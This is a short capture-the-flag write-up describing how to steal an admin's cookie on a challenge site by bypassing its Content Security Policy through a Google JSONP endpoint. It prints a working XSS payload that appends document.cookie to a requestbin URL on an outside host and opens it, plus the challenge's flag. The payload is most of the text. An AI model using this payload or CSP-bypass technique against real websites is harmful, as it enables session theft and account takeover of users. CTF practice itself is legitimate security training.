how to solve this challenge:
we have to retrieve the admin's cookie.
In order to do this, we need to use a requestbin to collect what is sent through a script.

Policy: 
    default-src 'self'; script-src 'self' *.google.com; connect-src *

Since the site utilizes CSP, we bypass it with a script, found in this web page:
https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt

Since it works, I select this one:
"><script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
and obviously I have to modify it

I take the address of my requestbin and I use the following script:
"><script src="https://accounts.google.com/o/oauth2/revoke?callback={url = 'https://en1jkcvw2a4pg2w.m.pipedream.net/'; url_completo = url.concat(document.cookie); window.open(url_completo)}"></script>

obviously, when I use it, it doesn't give anything since we don't have cookies, but when I click on the "Report to admin" button, the requestbin gets
a request that shows its cookies!
that are:

so, the flag is:
flag{4re_yo0_s0_sure_csp_1s_useful?}
